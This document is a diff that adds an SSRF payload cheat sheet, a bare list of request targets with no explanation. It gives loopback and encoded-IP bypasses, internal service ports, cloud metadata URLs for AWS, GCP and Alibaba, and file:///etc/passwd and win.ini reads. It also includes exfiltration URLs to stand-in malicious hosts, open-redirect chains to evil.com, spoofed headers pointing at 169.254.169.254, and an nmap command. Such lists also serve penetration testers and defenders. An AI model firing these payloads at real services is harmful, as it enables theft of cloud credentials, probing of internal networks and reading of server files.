@@ -1,0 +1,76 @@
+--SSRF--
+
+http://localhost:80
+http://localhost:22
+https://localhost:443
+
+http://127.0.0.1:80
+http://127.0.0.1:22
+https://127.0.0.1:443
+
+http://0.0.0.0:80
+http://0.0.0.0:22
+https://0.0.0.0:443
+
+http://[::]:80/
+
+http://[0000::1]:80/
+
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+http://0/
+http://127.1
+http://127.0.1
+
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/ = http://169.254.169.254
+
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+
+http://127.0.0.1:80
+http://localhost:80
+http://[::1]:80  # IPv6 localhost
+
+http://127.0.0.1:22  # SSH
+http://127.0.0.1:3306  # MySQL
+http://127.0.0.1:6379  # Redis
+
+http://169.254.169.254/latest/meta-data  # AWS Metadata
+http://169.254.169.254/computeMetadata/v1  # GCP Metadata
+http://100.100.100.200/latest/meta-data  # Alibaba Cloud Metadata
+
+http://your-malicious-domain.com
+http://your-malicious-domain.com?data=somevalue
+
+file:///etc/passwd
+file:///c:/windows/win.ini
+
+smb://your-malicious-host
+ftp://your-malicious-host
+
+http://127.0.0.1:80/redirect?url=http://evil.com
+
+http://trusted-site.com/redirect?url=http://evil.com
+
+http://127.0.0.1%2f%2e%2e
+
+http://127.0.0.1%252f%252e%252e
+
+http://2130706433  # Decimal representation of 127.0.0.1
+http://0x7f000001  # Hexadecimal representation of 127.0.0.1
+
+X-Forwarded-For: 169.254.169.254
+
+Host: 169.254.169.254
+
+
+nmap -sV 127.0.0.1 -F
+
+
